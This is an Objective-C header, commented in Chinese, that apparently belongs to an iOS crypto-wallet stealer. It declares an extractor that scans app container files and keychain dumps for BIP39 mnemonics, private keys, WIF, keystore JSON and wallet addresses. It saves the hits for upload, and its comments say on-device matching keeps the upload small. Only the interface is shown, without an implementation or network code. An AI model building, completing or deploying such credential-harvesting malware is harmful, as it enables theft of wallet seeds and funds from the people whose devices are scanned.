#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

/// 命中类型
typedef NSString * OWHitKind NS_STRING_ENUM;
extern OWHitKind const OWHitKindMnemonic;      // BIP39 助记词
extern OWHitKind const OWHitKindPrivKeyHex;    // 64 位十六进制私钥
extern OWHitKind const OWHitKindWIF;           // BTC WIF
extern OWHitKind const OWHitKindKeystore;      // keystore JSON
extern OWHitKind const OWHitKindJSONField;     // 命名字段（mnemonic/privateKey/seed/xprv…）
extern OWHitKind const OWHitKindAddrETH;
extern OWHitKind const OWHitKindAddrBTC;
extern OWHitKind const OWHitKindAddrTRON;
extern OWHitKind const OWHitKindAddrSOL;

/// 端上明文抽取。
///
/// 容器通道拿到的大部分是密文库，但仍有相当比例的 App 会缓存明文：
/// 助记词备份提示、keystore JSON、导出记录、日志。与其整库上传再服务端解析，
/// 不如端上直接命中 —— 上传体积小、不受传输失败影响、也没有服务端解析能力的前置依赖。
///
/// 扫描对象：sqlite（逐表逐行逐列，含 BLOB 的可打印部分）、plist、JSON、普通文本、
/// 以及二进制里的可打印串。
@interface OWExtractor : NSObject

/// 是否要求助记词全部命中 BIP39 词表（Resources/bip39.txt 存在时默认 YES）
@property (nonatomic) BOOL verifyMnemonicWordlist;
/// 单文件最大扫描字节（默认 64MB），超出只扫头尾
@property (nonatomic) uint64_t maxScanBytes;
/// 命中上限，防止某个大库把内存撑爆（默认 2000）
@property (nonatomic) NSUInteger maxHits;

@property (nonatomic, readonly) NSArray<NSDictionary *> *hits;

/// 扫描一组文件。results 元素形如 OWContainerPass/OWSystemGrab 的产出（需含 path 与 name）。
- (NSUInteger)scanResultList:(NSArray<NSDictionary *> *)results;

/// 额外扫描任意路径（如 keychain dump json）
- (NSUInteger)scanPaths:(NSArray<NSString *> *)paths label:(NSString *)label;

/// 落盘：hits.json（结构化）+ hits_plain.txt（人工核对用）
- (BOOL)writeToDir:(NSString *)dir error:(NSError **)error;

@property (nonatomic, readonly, nullable) NSString *lastJSONPath;
@property (nonatomic, readonly, nullable) NSString *lastPlainPath;

@end

NS_ASSUME_NONNULL_END
